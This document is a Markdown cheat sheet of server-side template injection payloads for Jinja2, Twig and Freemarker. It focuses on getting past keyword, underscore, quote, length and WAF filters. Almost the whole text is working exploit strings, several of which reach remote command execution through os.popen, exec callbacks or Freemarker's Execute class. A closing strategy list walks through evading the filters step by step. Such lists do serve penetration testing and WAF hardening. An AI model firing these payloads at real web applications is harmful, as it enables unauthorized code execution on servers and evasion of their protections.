# SSTI - Filter/WAF Bypass Techniques

## String Concatenation to Avoid Blocklisted Keywords

### Jinja2/Python
```
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ [].__class__.__base__.__subclasses__() }}
{{ request['application']['__globals__']['__builtins__'] }}
{{ "sy"+"stem" }}           # Won't work directly, need attribute chains
{{ self.__init__.__globals__.__builtins__['__import__']('os').popen('id').read() }}
```

### Bypass Underscore Filter
```
{{ request|attr("__class__") }}
{{ request['__class__'] }}
{% set x = "__cla" + "ss__" %}{{ request[x] }}
```

### Bypass Quote Filter (use string concatenation without quotes)
```
{{ request[dict(__class__=1).keys()|join] }}
```

## Twig
```
{{['id']|filter('sy'~'stem')}}
{{_self.env.registerUndefinedFilterCallback("exec")}}
```

## Freemarker
```
<#assign val="fr"+"eemarker.template.utility.Execute"?new()>${val("id")}
```

## General Encoding Bypass Techniques

### Unicode Normalization
```
{{7*7}}                → Basic
{{7\u002a7}}           → Unicode escaped operator (context-dependent)
```

### Case Variation (rarely effective, but test)
```
{{REQUEST}}
{{Request}}
```

### Whitespace/Comment Injection
```
{{7*7}}
{#comment#}{{7*7}}
{{ 7 * 7 }}            # Extra spaces
```

### Alternative Delimiters (if primary blocked)
```
${...}     Freemarker/older Velocity
#{...}     Some engines
{{...}}    Jinja2/Twig/Django
<%...%>    ERB/JSP
```

## WAF Bypass via Nested Expressions
```
{{ self|attr('_TemplateReference__context')|attr('cycler')... }}
```

## Length-Restricted Payload (short WAF-evading Jinja2 RCE)
```
{{lipsum.__globals__.os.popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{joiner.__init__.__globals__.os.popen('id').read()}}
{{namespace.__init__.__globals__.os.popen('id').read()}}
```

## Detection Bypass (avoid obvious math when testing)
```
{{ 'a'.join(['','']) }}     # Non-math test to avoid pattern-based WAF
{{ config }}                 # Flask config object dump - if reflected, confirms Jinja2
```

## Testing Strategy
```
1. Start with basic {{7*7}} - if blocked, try alternate delimiters/encoding
2. If keyword filtered (e.g. "class", "system", "import"), use concatenation/attr()
3. If quotes filtered, use dict().keys()|join or request.args to avoid quotes
4. If length-limited, use short built-in globals (lipsum, cycler, joiner, namespace)
5. Check WAF response for which specific keyword triggered block
```
